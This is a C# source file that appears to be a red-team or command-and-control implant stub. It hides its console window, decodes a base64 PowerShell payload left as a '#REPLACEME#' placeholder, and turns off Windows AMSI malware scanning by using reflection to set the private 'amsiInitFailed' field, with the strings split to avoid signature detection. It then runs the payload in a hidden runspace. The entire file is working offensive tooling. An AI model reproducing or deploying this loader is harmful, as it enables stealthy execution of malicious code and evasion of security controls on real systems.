using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
        public static string p = "#REPLACEME#";
        public Program() {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            try
            {
                var amsi = scriptInvoker.GetType().Assembly.GetType("Syste" + "m.Management.Autom" + "ation.Ams" + "iUtils");
                var amsifield = amsi.GetField("am" + "siIni" + "tFailed", BindingFlags.NonPublic | BindingFlags.Static);
                amsifield.SetValue(null, true);
            } catch { }
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(p));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}